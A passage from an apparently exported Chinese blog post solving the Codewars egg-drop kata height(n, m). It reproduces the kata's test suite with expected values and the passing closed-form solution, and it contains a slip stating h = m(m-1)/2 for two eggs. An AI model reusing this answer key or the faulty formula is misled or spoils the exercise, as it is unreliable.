\\n```\\n1+(m-1)+(m-1)(m-2)/2 + 1+(m-2)+(m-2)(m-3)/2 + 1+(m-3)+(m-3)(m-4)/2 ...\\n```\\n\\n重点来了! `f(m) = m(m-1)/2 + (m-1)(m-2)/2 + (m-2)(m-3)/2 ...` 可表示为 `(m+2)(m+1)m/(3*2)`, 具体证明如下:\\n\\n```\\n当有3个蛋时, 假设推论成立, 那么\\n\\nf(m) - f(m-1) \\n= (m+2)(m+1)m/(3*2) - (m+1)m(m-1)/(3*2)\\n= 3(m+1)m/6\\n= (m+1)m/2\\n\\n可知, 推论成立.\\n```\\n\\n证明的过程是不是感觉很亲切? 对! 数学归纳法! (中学数学都白学了)\\n\\n所以, `3` 个鸡蛋 `m` 次机会 -->  h 可以表示为 \\n```\\n1+(m-1)+(m-1)(m-2)/2 + 1+(m-2)+(m-2)(m-3)/2 + 1+(m-3)+(m-3)(m-4)/2 ...\\n= m + m(m-1)/2 + m(m-1)(m-2)/(3*2)\\n```\\n\\n所以, `4` 个鸡蛋 `m` 次机会 -->  h 可以表示为 `m + m(m-1)/2 + m(m-1)(m-2)/(3*2) + m(m-1)(m-2)(m-3)/(4*3*2)` (不再证明)\\n\\n当有n个鸡蛋时, h 可表示为 `m + m(m-1)/2 + ... + m!/((m-n)!n!)` \\n\\n也就是答案中的代码了.\\n\\n甚至还有大神发现(或者他们知道什么更高级的定理), 问题的解可以理解为对 `(1+1)^m-1` 做泰勒展开的前 `n` 项:\\n\\n![](/content/images/2017/09/Screen-Shot-2017-09-25-at-2.40.27-PM.png)\\n\\n* 二项式的泰勒展开公式 : (1+x)^k = 1 + kx + k(k-1)/2!*x^2 + ... + k(k-1)...(k-n+1)/n!x^k + ...\\n\\n\\n### 后记\\n\\n在尝试解这道题的过程中, 还尝试过一些其他的思路, 最后都以失败告终, 例如用矩阵快速幂优化动态规划的思路, 最后也以失败告终.\\n\\n可得仅包含 `m` 的递推公式:\\n\\n![](/content/images/2017/09/P70925-174925-1-.jpg)\\n\\n具体可有如下代码. 不过最后也仅能通过 advanced, 而且并不快.\\n\\n```\\nimport numpy as np\\n\\ndef height(n, m):\\n    if n ==0 or m ==0:\\n        return 0\\n    matrix = np.zeros((n, n), dtype=object)\\n    for i in range(n):\\n        matrix[i][i] = 1\\n        if i < n-1:\\n            matrix[i][i+1] = 1\\n    res = np.ones((n, 1), dtype=object)\\n    for i in range(m-1):\\n        res = matrix.dot(res) + np.ones((n, 1), dtype=object)\\n    return res[0]\\n```\\n\\n关于[用矩阵快速幂优化动态规划的细节, 可参看这篇博客](http://blog.csdn.net/CSDNjiangshan/article/details/75136730).\\n\\n虽然最后并没有靠自己的独立思考找到问题的答案, 但在解题的过程中也有不小的收获, 看来在学习算法的路上还有很长的路要走啊! 共勉!\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><!--kg-card-begin: markdown--><p><img src=\"/content/images/2017/09/images.jpeg\" alt=\"\"></p>\n<p>在codewars上遇到这样一道题：</p>\n<blockquote>\n<p>Eulampy 有一筐鸡蛋, 有一天在一幢摩天大楼下, 他的朋友对他说, 如果你给我n个鸡蛋, 我保证可以告诉你, 在h层楼的范围内, 鸡蛋最多从第几次楼扔下来而不会被摔破. Eulampy说, &quot;没问题, 但是我最多同意你扔m次, 看你扔的次数太多我会难过的.&quot;, 请设计一个函数, height(n, m), 求扔鸡蛋实验的总量程, 即 h.</p>\n</blockquote>\n<p>需要说明的是, 我们假设每个鸡蛋的都是完全一样的, 当一个鸡蛋被扔下了而没破, 就可以再次使用.</p>\n<pre><code>原题地址：https://www.codewars.com/kata/faberge-easter-eggs-crush-test/train/python\n</code></pre>\n<p>重点来了, 这道题有三组测试, 分别是: 基础的(basic), 进阶的(advanced), 真格的(serious).</p>\n<pre><code>test.it('basic tests')\ntest.assert_equals(height(0,14),0)\ntest.assert_equals(height(2,0),0)\ntest.assert_equals(height(2,14),105)\ntest.assert_equals(height(7,20),137979)\n\ntest.it('advanced tests')\ntest.assert_equals(height(7,500),1507386560013475)\ntest.assert_equals(height(237,500),431322842186730691997112653891062105065260343258332219390917925258990318721206767477889789852729810256244129132212314387344900067338552484172804802659)\ntest.assert_equals(height(477,500),3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127420959866658939578436425342102468327399)\n\ntest.it('serious tests')\ntest.assert_equals(height(477,10000),600461396604105297697414530102187796624607351959572356167325648574309381899274255809992726647041509608874296502550889633566626669839693460163703754386982346596293491455058459167135769401101845748849154474806919582238098292865002615140455747337045606515913175800206705264197158348258877027342824497813598887212567460615138259041983561196905824547148562128771846272230901329804068790524523450526723439711852711480043539388255029594388405065227411436195811544328549172691557810516507323615400468586962803403389031164507526999175383227883564967859574994520910983381843074859047295120948531800868902878466257920126328541103471268056861774184467685136934882998123768531695075047132113902537018783846627502099156246969377215926174782697180458326177412430190794351610099943109019040476655865297322723014683870220977314898596096355345407775)\ntest.assert_equals(height(4477,10000),1322821654800439589583624607836730988904348989635184483838675315989863014466105368917516854788173412697117838413572154358020136361352589223655004309284002331356645126308444045548293566543482035130766876362770186754407172004758665811853489554425555053643908845358225658078400880897420458613361537230692347145029937146468449752350301582966318881236041448346697864308936041807973848575815961020957973841925430394889030910761307668821228255147323012321726504304076902912463702108956669795566661303469766408411346447369441900601416549889768545415835808703102634187636408616862788628220968336302080405978291461615690517333300338026427209023338744576796796711916921553117367799805818262372383440027895158535027538219368128415201884328355249194560412959735085368099726719812587209832125121706467856448219467001478841957398661311948630752866817235891668491371246314423172093241855801986462213764272472077704090737449586014952207200402488115806480036391258788025058712927761809494607747190593544252498024965313654475511753397288550572364193751016698751124385432059855618738610770405495965628076729605040379761490680887446751742893838217109555332410367754941969641188014103364853464553866605149284789373350284278475702952002720219396744665142719739890709306702230989773403063833223142722153866753072260856577382714941017978371516349454986201414282722361391051916542589551016023190730497041390846243435703142324656990673688597131961469432804559244656573403972845547140551161388227163311600434649131672174329566859257640294347413250504689740356122993141714018763824536995756394554473053764885655217850919825484110456823718017936279926312676444075372513295121643005522507990093614688397324087158672285564265461960725048409644632356562813282311892621316990617791305949952474644973231563181802912551788866587392922962344851922680688121341506499860485837386801968860995052055236149946250164753714765692652499211749864280505191012859114807502067989910205943513218116464920029858713308646212996605582239145947185971138791937105763767017369327250323372490209312303407044663140291579276982729680418229917148740734819240902048630120317091983651644063173722960555978628497587823422375493107579742775550922433788067185239451798388809414158837037653589325259023780409914069533039705450496176647169891013697813337588075535112140970187607803915384622627522925822608742766549203712747041753891038754047696049037861483951837513375322742464580059309440669921941688909946789319835787709445925359884114002203388057590959620340874700472926972472437928806956105916022048677333952506175442513146994611155259594220312914080066998804113859428782103809127996851589054428051854854318799508483531803897517007935349549152870011407064621017082135138020750461696192841200272984193298057507960103670538167626863921460268009725329427763452347838828602301814121408102409549978991436252168617142842111215900368726060166926158698664478612916125923479260041837538259289930459928491560009034059912265253387804412611357982786191578331327)\ntest.assert_equals(height(9477,10000),19950631168807583848837421626835850838234968318861924548520089498529438830221946631919961684036194597899331129423209124271556491349413781117593785932096323957855730046793794526765246551266059895520550086918193311542508608460618104685509074866089624888090489894838009253941633257850621568309473902556912388065225096643874441046759871626985453222868538161694315775629640762836880760732228535091641476183956381458969463899410840960536267821064621427333394036525565649530603142680234969400335934316651459297773279665775606172582031407994198179607378245683762280037302885487251900834464581454650557929601414833921615734588139257095379769119277800826957735674444123062018757836325502728323789270710373802866393031428133241401624195671690574061419654342324638801248856147305207431992259611796250130992860241708340807605932320161268492288496255841312844061536738951487114256315111089745514203313820202931640957596464756010405845841566072044962867016515061920631004186422275908670900574606417856951911456055068251250406007519842261898059237118054444788072906395242548339221982707404473162376760846613033778706039803413197133493654622700563169937455508241780972810983291314403571877524768509857276937926433221599399876886660808368837838027643282775172273657572744784112294389733810861607423253291974813120197604178281965697475898164531258434135959862784130128185406283476649088690521047580882615823961985770122407044330583075869039319604603404973156583208672105913300903752823415539745394397715257455290510212310947321610753474825740775273986348298498340756937955646638621874569499279016572103701364433135817214311791398222983845847334440270964182851005072927748364550578634501100852987812389473928699540834346158807043959118985815145779177143619698728131459483783202081474982171858011389071228250905826817436220577475921417653715687725614904582904992461028630081535583308130101987675856234343538955409175623400844887526162643568648833519463720377293240094456246923254350400678027273837755376406726898636241037491410966718557050759098100246789880178271925953381282421954028302759408448955014676668389697996886241636313376393903373453647052103349469928076954249980154345544196049720110441880956939571653303125965015135210943821418326301263747755849915390311849600620405839184806696574011638771223876684308393546154357007879197176278577010897776871509293312271446308325915207411683581162864877565099831828100966285215817182861422299916721214461558309048173509038700144141092935627106729962305873603830938160653941875633254649208486247541063094454500007666144426589865904402944100565434252161641454059574448959059378469034843694065251975339636452128242737679086169540365161261103781301842588718151775952124493692901275351280453566829099730411742607415703660912889996893392281666409912913934377489142688784235343954049469043333120897248862080530937185907276885584072254792345533781517753151320818102507950307194516201547412495983145614252402137833853984659077543542376699008277188650448599930163536123001047126485885945475644)\n</code></pre>\n<p>我想说, 在一开始拿到这道题的时候, 我完全低估了题目的难度...</p>\n<p>首先, 我试着先将问题简化一下,</p>\n<p>假设只有 <code>1</code> 个鸡蛋, <code>10</code> 次尝试机会, 那么, 为了确保我这一个鸡蛋扔下去后, 我能知道鸡蛋在某层楼刚好不被摔破, 唯一的方式是从1楼开始一层一层的往上增加, 一直到第10层, 如果鸡蛋还是没破, 那没办法了, 因为 <code>1</code> 个鸡蛋 <code>10</code> 次机会, 最多只能保证在10层楼的范围内, 测出鸡蛋刚好不破的楼层数.</p>\n<p>那让我们再进一步, 假如有 <code>2</code> 个鸡蛋, 还是 <code>10</code> 次机会, 让我们再来思考一下这个问题. 现在问题的关键是, 第一个鸡蛋我们应该从几楼开始往下扔? 需要考虑两种情况, 当我从第 <code>x</code> 层楼将鸡蛋扔下后, 鸡蛋也许碎了, 也许没碎. 假设鸡蛋碎了, 那么, 我必须确保我有办法通过剩下的 <code>1</code> 个鸡蛋和 <code>9</code> 次扔鸡蛋的机会测出鸡蛋在 <code>x-1</code> 层中刚好不破的楼层数. 一个鸡蛋的问题, 我们刚刚已经讨论过了, <code>1</code> 个鸡蛋 <code>9</code> 次机会, h 为 9, 即 <code>x-1 = 9</code>, 所以 <code>x = 1 + 9 = 10</code>, 也就是说, 第一次扔鸡蛋, 我们应当从 <code>10</code> 楼开始往下扔. 那么继续, 假如鸡蛋没破呢, 那好办了, 我们现在有 <code>2</code> 个鸡蛋 <code>9</code> 次机会, 通过和前面一样的思考, 第二次扔的时候, 我们应该从 <code>10 + 9 = 19</code> 层往下扔. 那如果鸡蛋仍然没破呢, 我们就应该从 <code>10 + 9 + 8 = 27</code> 层往下扔, 以此类推, 我们可以发现, 当我们有 <code>2</code> 个鸡蛋 <code>m</code> 次机会时, 最大楼层 <code>h = m(m-1)/2</code>, 正好是等差数列的求和公式!</p>\n<p>我整理了一下思路, 将上面的结论归纳了一下: 有 <code>n</code> 个鸡蛋, <code>m</code> 次尝试机会, 当我从第 <code>x</code> 层楼将鸡蛋扔下后, 鸡蛋也许碎了, 也许没碎. 假设鸡蛋碎了, 那么, 我必须确保我有办法通过剩下的 <code>n-1</code> 个鸡蛋和 <code>m-1</code> 次扔鸡蛋的机会在剩余的 <code>x-1</code> 层楼中测出鸡蛋刚好不破的层数. 假如鸡蛋没碎, 问题便转化成了 <code>n</code> 个鸡蛋 <code>m-1</code> 次机会的问题了. 嗯, 这听上去, 很递归!!!</p>\n<p>好, 现在思路有了, 就让我们用递归来搞定这道题吧! 首先, 根据以上的推理, 我们可以很容易的得出递推公式:</p>\n<blockquote>\n<p>height(n, m) = height(n, m-1) + height(n-1, m-1) + 1</p>\n</blockquote>\n<p>具体的实现代码如下(python):</p>\n<pre><code>def height(n, m):\n  if n == 0 or m ==0:\n    return 0\n  return height(n, m - 1) + height(n - 1, m - 1) + 1\n</code></pre>\n<p>代码可以说是相当简洁干净了, basic测试顺利通过!</p>\n<p>不过, 如果你真的以为这道题就到此为止的话, 你就和我一样天真了.</p>\n<p>advance测试的第一条就挂了 ...</p>\n<p>但我并没有放弃, 我开始仔细思考, 问题到底在哪呢 🤔</p>\n<p>有了! height(n, m) 被拆分成了 height(n, m-1) 和 height(n-1, m-1), height(n, m-1) 被拆分成 height(n, m-2) 和 height(n-1, m-2), 而 height(n-1, m-1) 也会被差分成 height(n-1, m-2) 和 height(n-2, m-2). 发现问题了吗? height(n-1, m-2) 在两个分支里分别被计算了一次!! 考虑到 height(n-1, m-2) 后面还会衍生出很多的分支, 当 n, m 都比较大时, 这个计算量还是很客观的.</p>\n<p>想到这里, 我马上对代码做了修改. 这里使用了python标准库中提供的<br>\n<code>@lru_cache</code> 注解, 实现对计算过的函数进行缓存, 同时, 为了避免参数递归层数过深, 还将最大递归深度限制调大.</p>\n<pre><code>from functools import lru_cache\nimport sys\n\nsys.setrecursionlimit(100000)\n\n@lru_cache(maxsize=1000)\ndef height(n, m):\n    if n == 0 or m ==0:\n        return 0\n    return height(n, m - 1) + height(n - 1, m - 1) + 1\n</code></pre>\n<p>果然, 这次我顺利通过了 advanced 级别的测试, 执行单条 advanced 级别测试大概需要花费 <code>800ms</code> 左右.</p>\n<p>不过, 如果你真的以为这道题就到此为止的话, 你就和我一样天真了.</p>\n<p>或许是因为层层嵌套的递归结构消耗了太多的资源, <code>serious</code> 级别的测试依然无法通过.</p>\n<p><img src=\"/content/images/2017/09/Screen-Shot-2017-09-25-at-11.55.36-AM.png\" alt=\"\"></p>\n<p>我不得不开始认真的思考, 问题的关键到底在哪里 🤔</p>\n<p>经过了各种Google学习, 我学习到了另一种解决这种递推式问题的方法, 那就是: 动态规划! 和递归一样, 动态规划\b的关键还是在于找出问题的递推公式, 即:</p>\n<blockquote>\n<p>height(n, m) = height(n, m-1) + height(n-1, m-1) + 1</p>\n</blockquote>\n<p>通过自底向上的方式得出问题的解, 在求解的过程中, 我们可以将前一步得出的计算结果保存下来, 避免重复计算.</p>\n<pre><code>def key(i,j):\n    return &quot;%s-%s&quot; % (i,j)\n\ndef height(n, m):\n    n = n if n &lt; m else m\n    save = {}\n    for j in range(0, m+1):\n        for i in range(0, n+1):\n            if j == 0 or i == 0:\n                save[key(i,j)] = 0\n                continue\n            save[key(i,j)] = save[key(i, j-1)] + 1 + save[key(i-1, j-1)]\n    return save[key(n,m)]\n</code></pre>\n<p>和之前递归的代码相比, 算出一条 advanced 测试所需要的时间从 <code>800ms</code> 下降到了 <code>600ms</code>, 甚至, 还通过了 <code>serious</code> 级别的第一条测试(虽然耗费了惊人的11000ms左右).</p>\n<p>到这一步, 我投降了. 第一次, 我选择看答案. 第一次, 我甚至连答案都看不懂. 代码如下:</p>\n<pre><code>def height(n, m):\n    h, t = 0, 1\n    for i in range(1, n + 1): \n        t = t * (m - i + 1) // i\n        h += t\n    return h\n</code></pre>\n<p>WTF ??????????????????????????????????????????????????????</p>\n<p>我大概花了3天时间, 来搞懂这段短短的代码.</p>\n<p>还是回到最初的思路上来:</p>\n<p><code>1</code> 个鸡蛋 <code>m</code> 次机会 --&gt;  h 可以表示为 <code>m</code></p>\n<p><code>2</code> 个鸡蛋 <code>m</code> 次机会 --&gt;  h 可以表示为</p>\n<pre><code>1+(m-1) + 1+(m-2) + 1+(m-3) ...\n= m + m(m-1)/2\n</code></pre>\n<p><code>3</code> 个鸡蛋 <code>m</code> 次机会 --&gt;  h 可以表示为</p>\n<pre><code>1+(m-1)+(m-1)(m-2)/2 + 1+(m-2)+(m-2)(m-3)/2 + 1+(m-3)+(m-3)(m-4)/2 ...\n</code></pre>\n<p>重点来了! <code>f(m) = m(m-1)/2 + (m-1)(m-2)/2 + (m-2)(m-3)/2 ...</code> 可表示为 <code>(m+2)(m+1)m/(3*2)</code>, 具体证明如下:</p>\n<pre><code>当有3个蛋时, 假设推论成立, 那么\n\nf(m) - f(m-1) \n= (m+2)(m+1)m/(3*2) - (m+1)m(m-1)/(3*2)\n= 3(m+1)m/6\n= (m+1)m/2\n\n可知, 推论成立.\n</code></pre>\n<p>证明的过程是不是感觉很亲切? 对! 数学归纳法! (中学数学都白学了)</p>\n<p>所以, <code>3</code> 个鸡蛋 <code>m</code> 次机会 --&gt;  h 可以表示为</p>\n<pre><code>1+(m-1)+(m-1)(m-2)/2 + 1+(m-2)+(m-2)(m-3)/2 + 1+(m-3)+(m-3)(m-4)/2 ...\n= m + m(m-1)/2 + m(m-1)(m-2)/(3*2)\n</code></pre>\n<p>所以, <code>4</code> 个鸡蛋 <code>m</code> 次机会 --&gt;  h 可以表示为 <code>m + m(m-1)/2 + m(m-1)(m-2)/(3*2) + m(m-1)(m-2)(m-3)/(4*3*2)</code> (不再证明)</p>\n<p>当有n个鸡蛋时, h 可表示为 <code>m + m(m-1)/2 + ... + m!/((m-n)!n!)</code></p>\n<p>也就是答案中的代码了.</p>\n<p>甚至还有大神发现(或者他们知道什么更高级的定理), 问题的解可以理解为对 <code>(1+1)^m-1</code> 做泰勒展开的前 <code>n</code> 项:</p>\n<p><img src=\"/content/images/2017/09/Screen-Shot-2017-09-25-at-2.40.27-PM.png\" alt=\"\"></p>\n<ul>\n<li>二项式的泰勒展开公式 : (1+x)^k = 1 + kx + k(k-1)/2!*x^2 + ... + k(k-1)...(k-n+1)/n!x^k + ...</li>\n</ul>\n<h3 id=\"\">后记</h3>\n<p>在尝试解这道题的过程中, 还尝试过一些其他的思路, 最后都以失败告终, 例如用矩阵快速幂优化动态规划的思路, 最后也以失败告终.</p>\n<p>可得仅包含 <code>m</code> 的递推公式:</p>\n<p><img src=\"/content/images/2017/09/P70925-174925-1-.jpg\" alt=\"\"></p>\n<p>具体可有如下代码. 不过最后也仅能通过 advanced, 而且并不快.</p>\n<pre><code>import numpy as np\n\ndef height(n, m):\n    if n ==0 or m ==0:\n        return 0\n    matrix = np.zeros((n, n), dtype=object)\n    for i in range(n):\n        matrix[i][i] = 1\n        if i &lt; n-1:\n            matrix[i][i+1] = 1\n    res = np.ones((n, 1), dtype=object)\n    for i in range(m-1):\n        res = matrix.dot(res) + np.ones((n, 1), dtype=object)\n    return res[0]\n</code></pre>\n<p>关于<a href=\"http://blog.csdn.net/CSDNjiangshan/article/details/75136730\">用矩阵快速幂优化动态规划的细节, 可参看这篇博客</a>.</p>\n<p>虽然最后并没有靠自己的独立思考找到问题的答案, 但在解题的过程中也有不小的收获, 看来在学习算法的路上还有很长的路要走啊! 共勉!</p>\n<!--kg-card-end: markdown--><!--kg-card-end: markdown-->","comment_id":"67","plaintext":"\n\n在codewars上遇到这样一道题：\n\n> Eulampy 有一筐鸡蛋, 有一天在一幢摩天大楼下, 他的朋友对他说, 如果你给我n个鸡蛋, 我保证可以告诉你, 在h层楼的范围内,\n鸡蛋最多从第几次楼扔下来而不会被摔破. Eulampy说, \"没问题, 但是我最多同意你扔m次, 看你扔的次数太多我会难过的.\", 请设计一个函数,\nheight(n, m), 求扔鸡蛋实验的总量程, 即 h.\n\n\n需要说明的是, 我们假设每个鸡蛋的都是完全一样的, 当一个鸡蛋被扔下了而没破, 就可以再次使用.\n\n原题地址：https://www.codewars.com/kata/faberge-easter-eggs-crush-test/train/python\n\n\n重点来了, 这道题有三组测试, 分别是: 基础的(basic), 进阶的(advanced), 真格的(serious).\n\ntest.it('basic tests')\ntest.assert_equals(height(0,14),0)\ntest.assert_equals(height(2,0),0)\ntest.assert_equals(height(2,14),105)\ntest.assert_equals(height(7,20),137979)\n\ntest.it('advanced tests')\ntest.assert_equals(height(7,500),1507386560013475)\ntest.assert_equals(height(237,500),431322842186730691997112653891062105065260343258332219390917925258990318721206767477889789852729810256244129132212314387344900067338552484172804802659)\ntest.assert_equals(height(477,500),3273390607896141870013189696827599152216642046043064789483291368096133796404674554883270092325904157150886684127420959866658939578436425342102468327399)\n\ntest.it('serious tests')\ntest.assert_equals(height(477,10000),600461396604105297697414530102187796624607351959572356167325648574309381899274255809992726647041509608874296502550889633566626669839693460163703754386982346596293491455058459167135769401101845748849154474806919582238098292865002615140455747337045606515913175800206705264197158348258877027342824497813598887212567460615138259041983561196905824547148562128771846272230901329804068790524523450526723439711852711480043539388255029594388405065227411436195811544328549172691557810516507323615400468586962803403389031164507526999175383227883564967859574994520910983381843074859047295120948531800868902878466257920126328541103471268056861774184467685136934882998123768531695075047132113902537018783846627502099156246969377215926174782697180458326177412430190794351610099943109019040476655865297322723014683870220977314898596096355345407775)\ntest.assert_equals(height(4477,10000),1322821654800439589583624607836730988904348989635184483838675315989863014466105368917516854788173412697117838413572154358020136361352589223655004309284002331356645126308444045548293566543482035130766876362770186754407172004758665811853489554425555053643908845358225658078400880897420458613361537230692347145029937146468449752350301582966318881236041448346697864308936041807973848575815961020957973841925430394889030910761307668821228255147323012321726504304076902912463702108956669795566661303469766408411346447369441900601416549889768545415835808703102634187636408616862788628220968336302080405978291461615690517333300338026427209023338744576796796711916921553117367799805818262372383440027895158535027538219368128415201884328355249194560412959735085368099726719812587209832125121706467856448219467001478841957398661311948630752866817235891668491371246314423172093241855801986462213764272472077704090737449586014952207200402488115806480036391258788025058712927761809494607747190593544252498024965313654475511753397288550572364193751016698751124385432059855618738610770405495965628076729605040379761490680887446751742893838217109555332410367754941969641188014103364853464553866605149284789373350284278475702952002720219396744665142719739890709306702230989773403063833223142722153866753072260856577382714941017978371516349454986201414282722361391051916542589551016023190730497041390846243435703142324656990673688597131961469432804559244656573403972845547140551161388227163311600434649131672174329566859257640294347413250504689740356122993141714018763824536995756394554473053764885655217850919825484110456823718017936279926312676444075372513295121643005522507990093614688397324087158672285564265461960725048409644632356562813282311892621316990617791305949952474644973231563181802912551788866587392922962344851922680688121341506499860485837386801968860995052055236149946250164753714765692652499211749864280505191012859114807502067989910205943513218116464920029858713308646212996605582239145947185971138791937105763767017369327250323372490209312303407044663140291579276982729680418229917148740734819240902048630120317091983651644063173722960555978628497587823422375493107579742775550922433788067185239451798388809414158837037653589325259023780409914069533039705450496176647169891013697813337588075535112140970187607803915384622627522925822608742766549203712747041753891038754047696049037861483951837513375322742464580059309440669921941688909946789319835787709445925359884114002203388057590959620340874700472926972472437928806956105916022048677333952506175442513146994611155259594220312914080066998804113859428782103809127996851589054428051854854318799508483531803897517007935349549152870011407064621017082135138020750461696192841200272984193298057507960103670538167626863921460268009725329427763452347838828602301814121408102409549978991436252168617142842111215900368726060166926158698664478612916125923479260041837538259289930459928491560009034059912265253387804412611357982786191578331327)\ntest.assert_equals(height(9477,10000),19950631168807583848837421626835850838234968318861924548520089498529438830221946631919961684036194597899331129423209124271556491349413781117593785932096323957855730046793794526765246551266059895520550086918193311542508608460618104685509074866089624888090489894838009253941633257850621568309473902556912388065225096643874441046759871626985453222868538161694315775629640762836880760732228535091641476183956381458969463899410840960536267821064621427333394036525565649530603142680234969400335934316651459297773279665775606172582031407994198179607378245683762280037302885487251900834464581454650557929601414833921615734588139257095379769119277800826957735674444123062018757836325502728323789270710373802866393031428133241401624195671690574061419654342324638801248856147305207431992259611796250130992860241708340807605932320161268492288496255841312844061536738951487114256315111089745514203313820202931640957596464756010405845841566072044962867016515061920631004186422275908670900574606417856951911456055068251250406007519842261898059237118054444788072906395242548339221982707404473162376760846613033778706039803413197133493654622700563169937455508241780972810983291314403571877524768509857276937926433221599399876886660808368837838027643282775172273657572744784112294389733810861607423253291974813120197604178281965697475898164531258434135959862784130128185406283476649088690521047580882615823961985770122407044330583075869039319604603404973156583208672105913300903752823415539745394397715257455290510212310947321610753474825740775273986348298498340756937955646638621874569499279016572103701364433135817214311791398222983845847334440270964182851005072927748364550578634501100852987812389473928699540834346158807043959118985815145779177143619698728131459483783202081474982171858011389071228250905826817436220577475921417653715687725614904582904992461028630081535583308130101987675856234343538955409175623400844887526162643568648833519463720377293240094456246923254350400678027273837755376406726898636241037491410966718557050759098100246789880178271925953381282421954028302759408448955014676668389697996886241636313376393903373453647052103349469928076954249980154345544196049720110441880956939571653303125965015135210943821418326301263747755849915390311849600620405839184806696574011638771223876684308393546154357007879197176278577010897776871509293312271446308325915207411683581162864877565099831828100966285215817182861422299916721214461558309048173509038700144141092935627106729962305873603830938160653941875633254649208486247541063094454500007666144426589865904402944100565434252161641454059574448959059378469034843694065251975339636452128242737679086169540365161261103781301842588718151775952124493692901275351280453566829099730411742607415703660912889996893392281666409912913934377489142688784235343954049469043333120897248862080530937185907276885584072254792345533781517753151320818102507950307194516201547412495983145614252402137833853984659077543542376699008277188650448599930163536123001047126485885945475644)\n\n\n我想说, 在一开始拿到这道题的时候, 我完全低估了题目的难度...\n\n首先, 我试着先将问题简化一下,\n\n假设只有 1  个鸡蛋, 10  次尝试机会, 那么, 为了确保我这一个鸡蛋扔下去后, 我能知道鸡蛋在某层楼刚好不被摔破,\n唯一的方式是从1楼开始一层一层的往上增加, 一直到第10层, 如果鸡蛋还是没破, 那没办法了, 因为 1  个鸡蛋 10  次机会,\n最多只能保证在10层楼的范围内, 测出鸡蛋刚好不破的楼层数.\n\n那让我们再进一步, 假如有 2  个鸡蛋, 还是 10  次机会, 让我们再来思考一下这个问题. 现在问题的关键是, 第一个鸡蛋我们应该从几楼开始往下扔?\n需要考虑两种情况, 当我从第 x  层楼将鸡蛋扔下后, 鸡蛋也许碎了, 也许没碎. 假设鸡蛋碎了, 那么, 我必须确保我有办法通过剩下的 1  个鸡蛋和 9 \n次扔鸡蛋的机会测出鸡蛋在 x-1  层中刚好不破的楼层数. 一个鸡蛋的问题, 我们刚刚已经讨论过了, 1  个鸡蛋 9  次机会, h 为 9, 即 x-1 =\n9, 所以 x = 1 + 9 = 10, 也就是说, 第一次扔鸡蛋, 我们应当从 10  楼开始往下扔. 那么继续, 假如鸡蛋没破呢, 那好办了, 我们现在有\n 2  个鸡蛋 9  次机会, 通过和前面一样的思考, 第二次扔的时候, 我们应该从 10 + 9 = 19  层往下扔. 那如果鸡蛋仍然没破呢, 我们就应该从\n 10 + 9 + 8 = 27  层往下扔, 以此类推, 我们可以发现, 当我们有 2  个鸡蛋 m  次机会时, 最大楼层 h = m(m-1)/2,\n正好是等差数列的求和公式!\n\n我整理了一下思路, 将上面的结论归纳了一下: 有 n  个鸡蛋, m  次尝试机会, 当我从第 x  层楼将鸡蛋扔下后, 鸡蛋也许碎了, 也许没碎.\n假设鸡蛋碎了, 那么, 我必须确保我有办法通过剩下的 n-1  个鸡蛋和 m-1  次扔鸡蛋的机会在剩余的 x-1  层楼中测出鸡蛋刚好不破的层数.\n假如鸡蛋没碎, 问题便转化成了 n  个鸡蛋 m-1  次机会的问题了. 嗯, 这听上去, 很递归!!!\n\n好, 现在思路有了, 就让我们用递归来搞定这道题吧! 首先, 根据以上的推理, 我们可以很容易的得出递推公式:\n\n> height(n, m) = height(n, m-1) + height(n-1, m-1) + 1\n\n\n具体的实现代码如下(python):\n\ndef height(n, m):\n  if n == 0 or m ==0:\n    return 0\n  return height(n, m - 1) + height(n - 1, m - 1) + 1\n\n\n代码可以说是相当简洁干净了, basic测试顺利通过!\n\n不过, 如果你真的以为这道题就到此为止的话, 你就和我一样天真了.\n\nadvance测试的第一条就挂了 ...\n\n但我并没有放弃, 我开始仔细思考, 问题到底在哪呢 🤔\n\n有了! height(n, m) 被拆分成了 height(n, m-1) 和 height(n-1, m-1), height(n, m-1) 被拆分成\nheight(n, m-2) 和 height(n-1, m-2), 而 height(n-1, m-1) 也会被差分成 height(n-1, m-2) 和\nheight(n-2, m-2). 发现问题了吗? height(n-1, m-2) 在两个分支里分别被计算了一次!! 考虑到 height(n-1, m-2)\n后面还会衍生出很多的分支, 当 n, m 都比较大时, 这个计算量还是很客观的.\n\n想到这里, 我马上对代码做了修改. 这里使用了python标准库中提供的\n@lru_cache  注解, 实现对计算过的函数进行缓存, 同时, 为了避免参数递归层数过深, 还将最大递归深度限制调大.\n\nfrom functools import lru_cache\nimport sys\n\nsys.setrecursionlimit(100000)\n\n@lru_cache(maxsize=1000)\ndef height(n, m):\n    if n == 0 or m ==0:\n        return 0\n    return height(n, m - 1) + height(n - 1, m - 1) + 1\n\n\n果然, 这次我顺利通过了 advanced 级别的测试, 执行单条 advanced 级别测试大概需要花费 800ms  左右.\n\n不过, 如果你真的以为这道题就到此为止的话, 你就和我一样天真了.\n\n或许是因为层层嵌套的递归结构消耗了太多的资源, serious  级别的测试依然无法通过.\n\n\n\n我不得不开始认真的思考, 问题的关键到底在哪里 🤔\n\n经过了各种Google学习, 我学习到了另一种解决这种递推式问题的方法, 那就是: 动态规划! 和递归一样, 动态规划\b的关键还是在于找出问题的递推公式, 即:\n\n> height(n, m) = height(n, m-1) + height(n-1, m-1) + 1\n\n\n通过自底向上的方式得出问题的解, 在求解的过程中, 我们可以将前一步得出的计算结果保存下来, 避免重复计算.\n\ndef key(i,j):\n    return \"%s-%s\" % (i,j)\n\ndef height(n, m):\n    n = n if n < m else m\n    save = {}\n    for j in range(0, m+1):\n        for i in range(0, n+1):\n            if j == 0 or i == 0:\n                save[key(i,j)] = 0\n                continue\n            save[key(i,j)] = save[key(i, j-1)] + 1 + save[key(i-1, j-1)]\n    return save[key(n,m)]\n\n\n和之前递归的代码相比, 算出一条 advanced 测试所需要的时间从 800ms  下降到了 600ms, 甚至, 还通过了 serious \n级别的第一条测试(虽然耗费了惊人的11000ms左右).\n\n到这一步, 我投降了. 第一次, 我选择看答案. 第一次, 我甚至连答案都看不懂. 代码如下:\n\ndef height(n, m):\n    h, t = 0, 1\n    for i in range(1, n + 1): \n        t = t * (m - i + 1) // i\n        h += t\n    return h\n\n\nWTF ??????????????????????????????????????????????????????\n\n我大概花了3天时间, 来搞懂这段短短的代码.\n\n还是回到最初的思路上来:\n\n1  个鸡蛋 m  次机会 --> h 可以表示为 m\n\n2  个鸡蛋 m  次机会 --> h 可以表示为\n\n1+(m-1) + 